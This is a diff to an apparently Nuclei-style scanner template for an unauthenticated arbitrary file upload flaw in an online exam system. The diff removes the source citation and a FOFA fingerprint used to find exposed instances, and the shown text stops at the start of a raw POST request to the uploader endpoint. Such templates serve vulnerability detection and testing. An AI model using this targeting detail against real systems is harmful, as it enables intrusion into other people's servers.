@@ -3,12 +3,8 @@ info:
   name: Exam在线考试系统存在前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fk8g9hvsp38bhuoi'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fk8g9hvsp38bhuoi
-    fofa: '"app/core/styles/js/jquery.min.js"'
 http:
 - raw:
   - 'POST /index.php?document-api-fineuploader HTTP/1.1
